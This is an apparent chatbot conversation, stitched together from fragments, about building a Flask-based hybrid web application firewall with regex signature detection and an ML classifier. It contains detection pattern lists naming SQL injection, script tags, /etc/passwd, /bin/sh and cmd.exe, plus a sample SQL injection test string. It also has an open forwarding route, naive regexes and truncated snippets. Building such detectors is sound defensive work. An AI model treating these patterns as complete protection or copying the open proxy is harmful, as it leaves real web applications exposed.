Alright, let's break down a minimalistic implementation for your Hybrid WAF with a proxy server.

High-Level Plan

We need a lightweight proxy server that:

  1. Intercepts HTTP requests

  2. Checks for malicious patterns (Signature-based detection)

  3. Passes the request through the ML model (Anomaly-based detection)

  4. Decides whether to allow or block the request

  5. Manually test by typing requests

Tech Stack

  • Flask (for the proxy server)

  • Scapy/Requests (for HTTP interception)

  • Joblib/Pickle (to load ML model and preprocessor)

Core Components

  1. Proxy Server (Flask-based)

    • Acts as an intermediary between client and actual web app.

    • Routes requests through both detection layers.

    • Logs results for manual analysis.

  2. Signature-Based Detection

    • Check request data against known attack signatures (regex-based).

  3. ML-Based Detection

    • Load .pkl model and preprocessor to classify request behavior.

  4. Decision Engine

    • If either layer detects an attack â†’ Block the request.

    • Otherwise, forward it to the intended destination.

ðŸš€ Phase 2: Implementing app.py (Flask Setup)

Now that we have our project structure, weâ€™ll set up the Flask app to act as a proxy server. This phase includes:

âœ… Initializing Flask
âœ… Setting up Blueprints (proxy.py, logs.py)
âœ… Configuring basic request handling

ðŸ“ Steps for Phase 2

1ï¸âƒ£ Initialize Flask App (app.py)
2ï¸âƒ£ Register Blueprints (for modular routing)
3ï¸âƒ£ Define Basic Proxy Route (manually enter request for testing)
4ï¸âƒ£ Run Flask Server on localhost:5000

ðŸ”¹ app.py (Flask Proxy Server)

python
from flask import Flask
from src.hybrid_waf.routes.proxy import proxy_bp
from src.hybrid_waf.routes.logs import logs_bp

def create_app():
    """Initialize Flask app and register blueprints"""
    app = Flask(__name__)

    # Register Blueprints (Routes)
    app.register_blueprint(proxy_bp, url_prefix="/proxy")
    app.register_blueprint(logs_bp, url_prefix="/logs")

    @app.route("/")
    def index():
        return "<h1>Hybrid WAF Proxy Server is Running</h1>"

    return app

if __name__ == "__main__":
    app = create_app()
    app.run(debug=True, host="127.0.0.1", port=5000)

ðŸ”¹ routes/proxy.py (Proxy Route)

python
from flask import Blueprint, request, jsonify

proxy_bp = Blueprint("proxy", __name__)

@proxy_bp.route("/test", methods=["GET", "POST"])
def test_proxy():
    """Manually enter a request to test WAF"""
    return jsonify({"message": "Proxy is active", "request_data": request.args if request.method == "GET" else request.json})

ðŸ”¹ routes/logs.py (Log Viewer)

python
from flask import Blueprint, jsonify
import os

logs_bp = Blueprint("logs", __name__)

LOG_FILE = "src/hybrid_waf/logs/request_history.log"

@logs_bp.route("/view", methods=["GET"])
def view_logs():
    """Fetch request history logs"""
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            logs = f.readlines()
        return jsonify({"logs": logs})
    return jsonify({"error": "Log file not found"}), 404

ðŸš€ Phase 3: Request Forwarding & Basic Proxy Logic

Objective:
Now that we have the Flask server and UI, weâ€™ll implement basic request forwarding so that:
âœ… Requests sent to our proxy server (/proxy/forward) are forwarded to the target destination
âœ… We can inspect and log the requests before forwarding

ðŸ“ Steps for Phase 3

1ï¸âƒ£ Set Up a Forwarding Route in proxy.py
2ï¸âƒ£ Capture and Log Request Data Before Forwarding
3ï¸âƒ£ Forward the Request to a Target URL
4ï¸âƒ£ Return the Response Back to the User

ðŸ”¹ Update proxy.py to Handle Forwarding

Modify routes/proxy.py to include request forwarding.

python
import requests
from flask import Blueprint, request, jsonify
import logging

proxy_bp = Blueprint("proxy", __name__)

# Set up logging
logging.basicConfig(filename="src/hybrid_waf/logs/request_history.log", level=logging.INFO, format="%(asctime)s - %(message)s")

@proxy_bp.route("/forward", methods=["GET", "POST"])
def forward_request():
    """Forwards request to target URL after logging"""
    
    target_url = request.args.get("target")  # Example: /proxy/forward?target=http://example.com
    if not target_url:
        return jsonify({"error": "Target URL is missing"}), 400

    # Log the request
    logging.info(f"Received {request.method} request to forward: {request.url}")

    try:
        if request.method == "GET":
            response = requests.get(target_url, params=request.args)
        else:
            response = requests.post(target_url, json=request.json)

        # Log response status
        logging.info(f"Forwarded request to {target_url}, Response Status: {response.status_code}")
        
        return response.content, response.status_code, response.headers.items()

    except Exception as e:
        logging.error(f"Error forwarding request: {str(e)}")
        return jsonify({"error": "Failed to forward request", "details": str(e)}), 500

ðŸš€ Phase 3: Implementing Request Inspection (No Forwarding)

Objective:
âœ… Capture and display the incoming request details
âœ… Classify requests as malicious or legitimate
âœ… Log the classification results

ðŸ“ Steps for Phase 3

1ï¸âƒ£ Define a Route for Request Inspection (/proxy/inspect)
2ï¸âƒ£ Extract Request Data (Headers, Body, URL, Method)
3ï¸âƒ£ Run Signature-Based Detection
4ï¸âƒ£ Run Machine Learning Model for Anomaly Detection
5ï¸âƒ£ Return and Display the Classification Result

ðŸ”¹ Update proxy.py to Inspect Requests

Modify routes/proxy.py to include request inspection instead of forwarding.

python
import logging
import joblib
import re
from flask import Blueprint, request, jsonify

# Load ML model and preprocessor
ml_model = joblib.load("models/ml_model.pkl")  
preprocessor = joblib.load("models/preprocessor.pkl")

proxy_bp = Blueprint("proxy", __name__)

# Define Malicious Signatures (for Signature-Based Detection)
MALICIOUS_PATTERNS = [
    r"(?:\b(?:select|union|insert|update|delete|drop|alter|create)\b.*\b(?:from|into|table)\b)",  # SQL Injection
    r"(<script.*?>.*?</script>)",  # XSS Attack
    r"(?:/etc/passwd|/bin/sh|cmd\.exe|powershell\.exe)"  # Command Injection
]

# Set up logging
logging.basicConfig(filename="src/hybrid_waf/logs/request_inspection.log", level=logging.INFO, format="%(asctime)s - %(message)s")


@proxy_bp.route("/inspect", methods=["GET", "POST"])
def inspect_request():
    """Inspects an incoming request for malicious activity"""

    # Extract Request Data
    request_data = {
        "method": request.method,
        "url": request.url,
        "headers": dict(request.headers),
        "body": request.get_json() if request.method == "POST" else None
    }

    # Signature-Based Detection
    is_malicious = False
    for pattern in MALICIOUS_PATTERNS:
        if request_data["body"] and re.search(pattern, str(request_data["body"]), re.IGNORECASE):
            is_malicious = True
            break
        if re.search(pattern, request_data["url"], re.IGNORECASE):
            is_malicious = True
            break

    # ML-Based Detection
    request_features = preprocessor.transform([request_data["url"]])  # Assuming URL-based classification
    ml_prediction = ml_model.predict(request_features)[0]

    # Final Classification
    classification = "Malicious" if is_malicious or ml_prediction == 1 else "Legitimate"

    # Log the request and classification
    logging.info(f"Request: {request_data} --> Classification: {classification}")

    return jsonify({"classification": classification, "details": request_data}), 200

âœ… Should return "Malicious" due to XSS pattern.

âœ… Steps to Modify proxy.py

Update proxy.py:

python
import joblib
import os
from flask import Blueprint, request, jsonify

proxy_bp = Blueprint("proxy", __name__)

# Load ML Model
ml_model_path = os.path.join(os.path.dirname(__file__), "../../models/ml_model.pkl")
ml_model = joblib.load(ml_model_path)

def manual_preprocess(input_text):
    """
    Manually preprocess input data instead of using preprocessor.pkl.
    Modify this function based on your preprocessing steps.
    """
    processed_text = input_text.lower().strip()  # Example: Convert to lowercase & remove spaces
    return processed_text

@proxy_bp.route("/check", methods=["POST"])
def check_request():
    """
    Route to check if an HTTP request is malicious or legitimate.
    """
    data = request.json
    if "query" not in data:
        return jsonify({"error": "Missing 'query' parameter"}), 400
    
    raw_query = data["query"]
    processed_query = manual_preprocess(raw_query)  # Apply manual preprocessing
    
    prediction = ml_model.predict([processed_query])[0]  # Make prediction

    return jsonify({
        "query": raw_query,
        "processed_query": processed_query,
        "prediction": "Malicious" if prediction == 1 else "Legitimate"
    })

ðŸ›  What We Did

  • Deleted preprocessor.pkl to avoid dependency.

  • Added manual_preprocess() function inside proxy.py for real-time preprocessing.

  • Modified /check endpoint to handle requests manually.

document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("checkButton").addEventListener("click", function() {
        let userInput = document.getElementById("userInput").value;

        fetch("/check", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ query: userInput })
        })
        .then(response => response.json())
        .then(data => {
            document.getElementById("output").innerText = "Result: " + data.prediction;
        })
        .catch(error => {
            console.error("Error:", error);
            document.getElementById("output").innerText = "Error processing request.";
        });
    });
});

ðŸš€ Detailed Implementation Plan: Hybrid WAF System

We are building a hybrid Web Application Firewall (WAF) that consists of two detection layers:

  1. Signature-Based Detection (Pattern Matching)

  2. Anomaly-Based Detection (ML Model)

ðŸŒ System Flow (End-to-End)

1ï¸âƒ£ Landing Page (/)

  • A simple page with a "Check Your Request" button.

  • When clicked, the user is redirected to Home Page (/home).

2ï¸âƒ£ Home Page (/home)

  • User Input:

    • A text box where the user enters a request (URL, GET, POST data).

    • A "Check Request" button to submit the request.

  • Backend Flow:

    1. Extract request components (URI, GET, POST).

    2. Step 1: Signature-Based Detection

      • Uses predefined attack patterns.

      • If a pattern is detected as valid â†’ request is logged as Legitimate â†’ STOP processing.

      • If anomalous â†’ move to ML Model for deeper analysis.

    3. Step 2: Feature Extraction

      • Compute 8 features from the request:

        • Length (URI, GET, POST)

        • Entropy (URI, GET, POST)

        • Numeric-Text Ratio (Combined)

        • Special Character Count (Combined)

      • Thresholding: If any value < 20 (except 0), set it to 20.

    4. Step 3: ML Model Prediction

      • Pass the extracted features to the trained model.

      • Model predicts Legitimate or Malicious.

    5. Step 4: Logging & Display

      • Result is stored in logs/detections.log.

      • Display the final classification (Legitimate/Malicious) on the UI.

Your main.py is already handling the main navigation correctly. However, we should structure it in a more modular way by:

  1. Using Blueprints â€“ Instead of defining routes directly in app.py, we should keep them in src/hybrid_waf/routes/main.py to ensure modularity.

1ï¸âƒ£ Update src/hybrid_waf/routes/main.py

Modify your existing main.py to use Blueprints.

python
from flask import Blueprint, render_template

main_bp = Blueprint('main', __name__)

@main_bp.route('/')
def index():
    return render_template('index.html')

@main_bp.route('/home')
def home():
    return render_template('home.html')

2ï¸âƒ£ Update app.py to Register Blueprint

Modify app.py to register this new main_bp Blueprint.

python
from flask import Flask
from src.hybrid_waf.routes.main import main_bp  # Import the Blueprint

app = Flask(__name__)

# Register the blueprint
app.register_blueprint(main_bp)

if __name__ == '__main__':
    app.run(debug=True)

Why This Approach?

âœ… Modular â€“ If you add more routes later, app.py stays clean.
âœ… Reusable â€“ You can extend main.py or add new route files without modifying app.py.

Implementation Plan (Modular & Reusable)

We'll follow a structured approach to keep the code modular, so future enhancements (like adding ML-based detection) wonâ€™t disturb the existing functionality.

Files to Modify & Their Roles

1ï¸âƒ£ proxy.py (Handles request processing)

  • Accepts user input (simulated request).

  • Passes the request to the signature checker.

  • Prints "Valid Request" or "Malicious Request".

2ï¸âƒ£ signature_checker.py (Handles signature-based detection)

  • Contains predefined patterns for malicious requests.

  • Checks if the request matches any malicious patterns.

Code Implementation

ðŸ”¹ proxy.py (Handles request processing)

python
from flask import Blueprint, request, jsonify
from src.hybrid_waf.utils.signature_checker import check_signature

proxy_bp = Blueprint('proxy', __name__)

@proxy_bp.route('/check_request', methods=['POST'])
def check_request():
    """
    API endpoint to check if the request is valid or malicious based on signature detection.
    """
    user_input = request.json.get("user_request", "")

    # Check against signature-based detection
    is_malicious = check_signature(user_input)

    if is_malicious:
        result = {"status": "malicious", "message": "Malicious Request Detected"}
    else:
        result = {"status": "valid", "message": "Valid Request"}

    return jsonify(result)

ðŸ”¹ signature_checker.py (Signature-Based Detection Logic)

python
import re

# Define malicious patterns (this can be expanded)
MALICIOUS_PATTERNS = [
    r"(?:\bunion\b|\bselect\b|\binsert\b|\bdelete\b|\bdrop\b|\bupdate\b).*?\bfrom\b",  # SQL Injection
    r"(\bscript\b|<script>)",  # XSS Attack
    r"(\balert\b|\bconsole\.log\b)",  # Potential JavaScript-based attacks
    r"(?:--)|(/\*.*?\*/)|(#.*?\n)",  # Comment-based SQL Injection
]

def check_signature(user_input: str) -> bool:
    """
    Checks if the user request matches any malicious patterns.
    
    :param user_input: The input request from the user.
    :return: True if malicious, False otherwise.
    """
    for pattern in MALICIOUS_PATTERNS:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True  # Malicious request detected
    return False  # Valid request

Why This is Modular?

âœ… Easy Expansion â†’ We can add more attack patterns in MALICIOUS_PATTERNS.
âœ… Independent Components â†’ Signature logic is separate from request handling.
âœ… Future Integration â†’ Later, we can add ML-based detection after signature checking.

2ï¸âƒ£ Use Postman or cURL to send a POST request to /check_request with:

json
{ "user_request": "SELECT * FROM users WHERE 1=1" }

3ï¸âƒ£ Expected Output:

json
{ "status": "malicious", "message": "Malicious Request Detected" }

4ï¸âƒ£ Try with a normal string (e.g., "Hello World").

json

def check_request():
    user_input = request.json.get("user_request", "")

    is_malicious = check_signature(user_input)

    result = {
        "status": "malicious" if is_malicious else "valid",
        "message": "Malicious Request Detected" if is_malicious else "Valid Request"
    }
    return jsonify(result)

âœ… Step 3: Fix JSON Response in proxy.py

Modify proxy.py to return proper JSON even when errors occur:

python
from flask import Blueprint, request, jsonify
from src.hybrid_waf.utils.signature_checker import check_signature

proxy_bp = Blueprint('proxy', __name__)

@proxy_bp.route('/check_request', methods=['POST'])
def check_request():
    try:
        if not request.is_json:
            return jsonify({"error": "Invalid JSON"}), 400  # Bad Request

        data = request.get_json()
        user_input = data.get("user_request", "")

        is_malicious = check_signature(user_input)

        result = {
            "status": "malicious" if is_malicious else "valid",
            "message": "Malicious Request Detected" if is_malicious else "Valid Request"
        }
        return jsonify(result)  # âœ… Always return JSON

    except Exception as e:
        return jsonify({"error": str(e)}), 500  # Internal Server Error

âœ… Why?

  • This ensures Flask NEVER returns HTML, even if there's an error.

  • If something breaks, it returns JSON { "error": "Something went wrong" }.

âœ… Step 4: Debug in home.js

js
function checkRequest() {
    let userRequest = document.getElementById("userRequest").value;
    console.log("User Request:", userRequest);

    fetch("/check_request", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ user_request: userRequest })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error("HTTP error! Status: " + response.status);
        }
        return response.json();
    })
    .then(data => {
        console.log("Response Data:", data);
        document.getElementById("result").innerText = data.message;
        document.getElementById("result").style.color = data.status === "malicious" ? "red" : "green";
    })
    .catch(error => {
        console.error("Fetch error:", error);
        document.getElementById("result").innerText = "Error processing request.";
        document.getElementById("result").style.color = "red";
    });
}

âœ… Why?

  • If the response is not JSON, it throws an error.

  • It shows "Error processing request" instead of crashing.

ðŸ” What Was the Issue?

Your proxy.py file contained the /check_request route, but Flask did not know about it because you never registered proxy_bp in app.py.

Simple Example (Like a Contact List ðŸ“ž)

Think of Flask Blueprints (bp) like a phone contact list:

  1. You have two friends:

    • Friend A (main.py) â†’ Handles Home Page ðŸ“„

    • Friend B (proxy.py) â†’ Handles Request Checking âœ…

  2. You saved only Friend Aâ€™s number in your phone (app.register_blueprint(main_bp)), but forgot to save Friend B's number (proxy_bp missing).

  3. When you try calling Friend B (/check_request), your phone says:

    • "Sorry, this number is not available" (Flask returns an HTML error instead of JSON).

  4. Once you add Friend Bâ€™s number (app.register_blueprint(proxy_bp)), now you can call them without any issue.

What is a Blueprint (bp)?

A Blueprint (bp) in Flask is a modular way to structure your app.

  • Instead of writing all routes in one file, we split them into multiple files and register them in app.py.

Example of Blueprint Usage

ðŸ’¡ Without Blueprints (Everything in one file):

python
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    return "Welcome to Home Page"

@app.route('/check_request')
def check_request():
    return "Checking Request..."

âŒ Problem: As the app grows, managing routes in one file becomes messy.

ðŸ’¡ With Blueprints (Modular Approach):
1ï¸âƒ£ app.py (Main Entry Point)

python
from flask import Flask
from routes.main import main_bp
from routes.proxy import proxy_bp

app = Flask(__name__)

# Register Blueprints
app.register_blueprint(main_bp)
app.register_blueprint(proxy_bp)

if __name__ == '__main__':
    app.run(debug=True)

2ï¸âƒ£ routes/main.py (Handles Home Page)

python
from flask import Blueprint, render_template

main_bp = Blueprint('main', __name__)

@main_bp.route('/')
def index():
    return render_template('index.html')

3ï¸âƒ£ routes/proxy.py (Handles Request Checking)

python
from flask import Blueprint, request, jsonify

proxy_bp = Blueprint('proxy', __name__)

@proxy_bp.route('/check_request', methods=['POST'])
def check_request():
    return jsonify({"message": "Checking Request..."})

Benefits of Using Blueprints

âœ” Organized Code â†’ Each feature has its own file (main.py, proxy.py).
âœ” Scalability â†’ Easily add new features without modifying the whole app.
âœ” Reusability â†’ You can reuse blueprints in multiple projects.

Summary

  • Issue: /check_request was not registered, so Flask returned an error page instead of JSON.

  • Fix: Registered proxy_bp in app.py so Flask recognizes it.

  • Blueprints (bp): They modularize the app, keeping it clean & scalable.

python
import re

# Define malicious patterns
MALICIOUS_PATTERNS = [
    r"(?:\bunion\b|\bselect\b|\binsert\b|\bdelete\b|\bdrop\b|\bupdate\b).*?\bfrom\b",  # SQL Injection
    r"(\bscript\b|<script>)",  # XSS Attack
    r"(\balert\b|\bconsole\.log\b)",  # Potential JavaScript-based attacks
    r"(?:--)|(/\*.*?\*/)|(#.*?\n)",  # Comment-based SQL Injection
]

def check_signature(user_input: str) -> bool:
    """
    Checks if the user request matches any malicious patterns.
    
    :param user_input: The input request from the user.
    :return: True if malicious, False otherwise.
    """
    print(f"Checking input: {user_input}")  # Debug print

    for pattern in MALICIOUS_PATTERNS:
        if re.search(pattern, user_input, re.IGNORECASE):
            print(f"Matched pattern: {pattern}")  # Debug print
            return True  # Malicious request detected

    print("No match found, request is valid.")  # Debug print
    return False  # Valid request

Below is a stepâ€byâ€step, modular implementation that integrates both the signatureâ€based check and (if flagged) an MLâ€“based detection. Weâ€™ll assume that your ML model is already trained and saved as ml_model.pkl, and weâ€™ll skip any threshold adjustments.

1. app.py

Ensure all blueprints are registered so that every route is recognized.

python
from flask import Flask
from src.hybrid_waf.routes.main import main_bp  # For landing/home pages
from src.hybrid_waf.routes.proxy import proxy_bp  # For request validation

app = Flask(__name__)

# Register blueprints

app.register_blueprint(proxy_bp)

if __name__ == '__main__':
    app.run(debug=True)

2. src/hybrid_waf/routes/proxy.py

This file handles the request validation logic. It first checks the input with the signature checker.
If no malicious patterns are found, it immediately returns â€œValid Request.â€
If a malicious pattern is found, it extracts (or fills) the URI, GET, and POST data, computes features via our preprocessor, passes these to the ML model, logs the result, and returns the final prediction.

python
from flask import Blueprint, request, jsonify
from src.hybrid_waf.utils.signature_checker import check_signature

proxy_bp = Blueprint('proxy', __name__)

@proxy_bp.route('/check_request', methods=['POST'])
def check_request():
    # Get JSON input from the client
    data = request.get_json()
    
    # The client can send a general "user_request" string.
    # For ML analysis, we prefer to have separate fields.
    # If not provided, we assume the entire input goes to the URI.
    user_input = data.get("user_request", "")
    uri = data.get("uri", user_input)
    get_data = data.get("get_data", "")
    post_data = data.get("post_data", "")
    
    # --- Step 1: Signature-Based Detection ---
    # If no malicious pattern is found, immediately return valid.
    signature_flag = check_signature(user_input)
    if not signature_flag:
        result = {
            "status": "valid",
            "message": "Valid Request (Signature Check)"
        }
        return jsonify(result)
    
    # --- Step 2: ML-Based Anomaly Detection ---
    # Import the preprocessor function to extract features.
    from src.hybrid_waf.utils.preprocessor import extract_features
    features = extract_features(uri, get_data, post_data)
    
    # Import the ML checker function to get a prediction.
    from src.hybrid_waf.utils.ml_checker import check_ml_prediction
    prediction = check_ml_prediction(features)
    
    if prediction == 1:
        final_status = "malicious"
        message = "Malicious Request Detected (ML Prediction)"
    else:
        final_status = "valid"
        message = "Valid Request (ML Prediction)"
    
    result = {
        "status": final_status,
        "message": message,
        "features": features  # Optionally return features for debugging
    }
    
    # Log the result to detections.log
    with open("logs/detections.log", "a") as log_file:
        log_file.write(f"{result}\n")
    
    return jsonify(result)

3. src/hybrid_waf/utils/signature_checker.py

This module contains the regex patterns and the function to check the user input against known attack patterns.

python
import re

# Define malicious patterns (expand as needed)
MALICIOUS_PATTERNS = [
    r"(?:\bunion\b|\bselect\b|\binsert\b|\bdelete\b|\bdrop\b|\bupdate\b).*?\bfrom\b",  # SQL Injection
    r"(\bscript\b|<script>)",  # XSS Attack
    r"(\balert\b|\bconsole\.log\b)",  # JavaScript-based attacks
    r"(?:--)|(/\*.*?\*/)|(#.*?\n)",  # Comment-based SQL Injection
]

def check_signature(user_input: str) -> bool:
    """
    Checks if the user request matches any malicious patterns.
    Returns True if malicious, False otherwise.
    """
    # (Optional) Normalize input: remove extra spaces, convert to lowercase
    user_input = " ".join(user_input.split())
    
    for pattern in MALICIOUS_PATTERNS:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True  # Malicious pattern found
    return False  # No malicious pattern detected

4. src/hybrid_waf/utils/preprocessor.py

This module contains reusable functions for feature extraction. We compute eight features:

  • URI_Length, GET_Length, POST_Length

  • URI_Entropy, GET_Entropy, POST_Entropy

  • Numeric_Text_Ratio (on the concatenated string)

  • Special_Char_Count (using a predefined list)

python
import math

def compute_length(text: str) -> int:
    return len(text)

def shannon_entropy(text: str) -> float:
    if not text:
        return 0.0
    frequency = {}
    for char in text:
        frequency[char] = frequency.get(char, 0) + 1
    entropy = 0.0
    for freq in frequency.values():
        p = freq / len(text)
        entropy -= p * math.log2(p)
    return entropy

def numeric_text_ratio(text: str) -> float:
    if not text:
        return 0.0
    numeric_count = sum(c.isdigit() for c in text)
    alpha_count = sum(c.isalpha() for c in text)
    if alpha_count == 0:
        return float(numeric_count)
    return numeric_count / alpha_count

def special_char_count(text: str) -> int:
    # Define special characters to count
    special_chars = ["'", '"', "{", "}", "[", "]", "--", ";", "/", "\\", "=", "<", ">"]
    count = 0
    for sp in special_chars:
        count += text.count(sp)
    return count

def extract_features(uri: str, get_data: str, post_data: str) -> list:
    """
    Extracts eight features from the provided URI, GET, and POST data.
    Returns a list of features in the following order:
      [URI_Length, GET_Length, POST_Length, URI_Entropy, GET_Entropy, POST_Entropy,
       Numeric_Text_Ratio, Special_Char_Count]
    """
    features = {}
    features["URI_Length"] = compute_length(uri)
    features["GET_Length"] = compute_length(get_data)
    features["POST_Length"] = compute_length(post_data)
    features["URI_Entropy"] = shannon_entropy(uri)
    features["GET_Entropy"] = shannon_entropy(get_data)
    features["POST_Entropy"] = shannon_entropy(post_data)
    combined = uri + get_data + post_data
    features["Numeric_Text_Ratio"] = numeric_text_ratio(combined)
    features["Special_Char_Count"] = special_char_count(combined)
    
    # Return the features as a fixed-order list
    return [
        features["URI_Length"],
        features["GET_Length"],
        features["POST_Length"],
        features["URI_Entropy"],
        features["GET_Entropy"],
        features["POST_Entropy"],
        features["Numeric_Text_Ratio"],
        features["Special_Char_Count"]
    ]

5. src/hybrid_waf/utils/ml_checker.py

This module loads your pre-trained ML model and defines a function to perform a prediction given a list of features.

python
import os
import joblib

# Construct the path to the ML model relative to this file
MODEL_PATH = os.path.join(os.path.dirname(__file__), "../../models/ml_model.pkl")
ml_model = joblib.load(MODEL_PATH)

def check_ml_prediction(features: list) -> int:
    """
    Takes a list of eight features and returns the ML prediction.
    Assumes the model outputs 1 for malicious and 0 for valid.
    """
    prediction = ml_model.predict([features])[0]  # Pass as a 2D array
    return prediction

How It All Works Together

  1. User submits a request (via your UI, which sends JSON containing at least "user_request"; optionally, separate "uri", "get_data", and "post_data" fields).

  2. proxy.py calls signature_checker.py to check if the request matches any known malicious patterns.

    • If no patterns match â†’ the request is immediately labeled "Valid Request".

  3. If a malicious pattern is detected, proxy.py:

    • Extracts the request into uri, get_data, and post_data (using empty strings for missing parts).

    • Calls preprocessor.py to extract eight features from these components.

    • Passes these features to the ML model using ml_checker.py.

    • Depending on the ML modelâ€™s prediction (1 for malicious, 0 for valid), it returns the final result.

  4. The result is also logged in logs/detections.log.

This modular, step-by-step code should integrate seamlessly. Let me know if you have any questions or need further adjustments!

For clarity, here's the final home.js code that will display "Valid Request" or "Malicious Request" based on the response:

js
document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("checkBtn").addEventListener("click", function () {
        checkRequest();
    });
});

function checkRequest() {
    let userRequest = document.getElementById("userRequest").value;
    console.log("User Request:", userRequest);

    fetch("/check_request", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ user_request: userRequest })
    })
    .then(response => response.json())
    .then(data => {
        console.log("Response:", data);
        document.getElementById("result").innerText = data.message;
        document.getElementById("result").style.color = data.status === "malicious" ? "red" : "green";
    })
    .catch(error => console.error("Fetch error:", error));
}

This code listens for a click event on the button (with ID checkBtn), sends the request to the backend, and then displays the result on the page (inside the element with ID result).

So, as long as your backend returns the appropriate JSON response, home.js will print the result without any further changes.

You said:
Fetch error: SyntaxError: Unexpected token '<', "<!doctype "... is not valid JSON getting error for malicious working fine fine for valid
ChatGPT said:

The error message

javascript
Fetch error: SyntaxError: Unexpected token '<', "<!doctype "... is not valid JSON

indicates that when processing a malicious request, the server is returning an HTML error page (starting with <!doctype html>) instead of valid JSON. This usually happens because an exception is thrown in the ML detection branch, and Flask (or your error handler) returns an HTML error page.

What Could Be Causing It?

  • An Exception in Feature Extraction or ML Prediction:
    When the request is flagged as malicious, your code proceeds to extract features (URI, GET, POST) and then calls the ML model. If something goes wrong (e.g., unexpected input format, error in feature extraction, or the ML model prediction), an exception is raised, and Flask returns an HTML error page.

  • Lack of Proper Error Handling:
    Without a try-except block in the malicious branch, any error wonâ€™t be caught and converted into a JSON response.

How to Fix It

  1. Wrap the ML-based detection code in a try-except block in proxy.py so that if any error occurs, you catch it and return a JSON error message.

  2. Log the exception so you can inspect the server logs and determine the exact cause.

Step-by-Step Updated Code in proxy.py

Below is an updated version of the malicious branch with proper error handling:

python
from flask import Blueprint, request, jsonify
from src.hybrid_waf.utils.signature_checker import check_signature

proxy_bp = Blueprint('proxy', __name__)

@proxy_bp.route('/check_request', methods=['POST'])
def check_request():
    data = request.get_json()

    # Get general user request and individual fields; if not provided, default to empty string.
    user_input = data.get("user_request", "")
    uri = data.get("uri", user_input)
    get_data = data.get("get_data", "")
    post_data = data.get("post_data", "")
    
    # --- Step 1: Signature-Based Detection ---
    signature_flag = check_signature(user_input)
    if not signature_flag:
        result = {
            "status": "valid",
            "message": "Valid Request (Signature Check)"
        }
        return jsonify(result)
    
    # --- Step 2: ML-Based Anomaly Detection ---
    try:
        # Import the preprocessor function to extract features.
        from src.hybrid_waf.utils.preprocessor import extract_features
        features = extract_features(uri, get_data, post_data)
        
        # Import the ML checker function to get a prediction.
        from src.hybrid_waf.utils.ml_checker import check_ml_prediction
        prediction = check_ml_prediction(features)
        
        if prediction == 1:
            final_status = "malicious"
            message = "Malicious Request Detected (ML Prediction)"
        else:
            final_status = "valid"
            message = "Valid Request (ML Prediction)"
        
        result = {
            "status": final_status,
            "message": message,
            "features": features  # For debugging, can be removed later
        }
        
        # Log the result
        with open("logs/detections.log", "a") as log_file:
            log_file.write(f"{result}\n")
        
        return jsonify(result)
    
    except Exception as e:
        # Log the error to your console or log file
        print("Error in ML-based detection:", e)
        return jsonify({"error": f"Internal server error: {str(e)}"}), 500

Explanation:

  • Try-Except Block:
    The ML branch is wrapped in a try-except block. If any exception occurs during feature extraction or ML prediction, the exception is caught, logged, and a JSON response with the error message is returned with a 500 status code.

  • Consistent JSON Response:
    This ensures that no matter what, the response is always JSON. This prevents the frontend from trying to parse HTML as JSON, which caused the error.

  • Logging:
    The exception is printed (you could also log it to a file) so you can inspect what went wrong on the server side.

Testing:

  1. Enter a Valid Request:

    • It should return "Valid Request (Signature Check)" in green.

  2. Enter a Malicious Request:

    • It should attempt ML-based detection.

Updated signature_checker.py

python
import re

# Define known malicious patterns (expand as needed)
MALICIOUS_PATTERNS = [
    r"(?:\bunion\b|\bselect\b|\binsert\b|\bdelete\b|\bdrop\b|\bupdate\b).*?\bfrom\b",  # SQL Injection
    r"(\bscript\b|<script>)",  # XSS Attack
    r"(\balert\b|\bconsole\.log\b)",  # JavaScript-based attacks
    r"(?:--)|(/\*.*?\*/)|(#.*?\n)",  # Comment-based SQL Injection
]

# Define obfuscation patterns (suspicious but not explicit attacks)
OBFUSCATION_PATTERNS = [
    r"(%[0-9A-Fa-f]{2})+",  # URL encoding
    r"(\\x[0-9A-Fa-f]{2})+",  # Hex encoding
    r"(\bchar\b|\bconcat\b|\bsubstr\b)",  # SQL obfuscation functions
]

def check_signature(user_input: str):
    """
    Checks if the user request matches malicious or obfuscation patterns.
    Returns:
        - "malicious" if it's an attack
        - "obfuscated" if it looks suspicious
        - "valid" if nothing is detected
    """
    user_input = " ".join(user_input.split())  # Normalize input
    
    for pattern in MALICIOUS_PATTERNS:
        if re.search(pattern, user_input, re.IGNORECASE):
            return "malicious"  # Directly detected attack
    
    for pattern in OBFUSCATION_PATTERNS:
        if re.search(pattern, user_input, re.IGNORECASE):
            return "obfuscated"  # Suspicious but needs further analysis

    return "valid"  # No issues detected

Updated proxy.py

python
from flask import Blueprint, request, jsonify
from src.hybrid_waf.utils.signature_checker import check_signature

proxy_bp = Blueprint('proxy', __name__)

@proxy_bp.route('/check_request', methods=['POST'])
def check_request():
    data = request.get_json()
    
    user_input = data.get("user_request", "")
    uri = data.get("uri", user_input)
    get_data = data.get("get_data", "")
    post_data = data.get("post_data", "")
    
    # --- Step 1: Signature-Based Detection ---
    signature_result = check_signature(user_input)
    
    if signature_result == "valid":
        return jsonify({"status": "valid", "message": "Valid Request (Signature Check)"})

    if signature_result == "malicious":
        return jsonify({"status": "malicious", "message": "Malicious Request Detected (Signature Check)"})
    
    # --- Step 2: ML-Based Anomaly Detection (Only for obfuscated requests) ---
    if signature_result == "obfuscated":
        from src.hybrid_waf.utils.preprocessor import extract_features
        from src.hybrid_waf.utils.ml_checker import check_ml_prediction
        
        features = extract_features(uri, get_data, post_data)
        prediction = check_ml_prediction(features)
        
        final_status = "malicious" if prediction == 1 else "valid"
        message = f"Obfuscated Request - Checked via ML: {final_status}"

        return jsonify({
            "status": final_status,
            "message": message,
            "features": features
        })

        }

        document.getElementById("result").innerHTML = `<span style="color: gray;">âŒ Error processing request.</span>`;
    });

python
import pandas as pd
import joblib

# Load trained model
model = joblib.load("path/to/your/model.pkl")

def check_ml_prediction(features):
    # Ensure features have the correct format (DataFrame with proper column names)
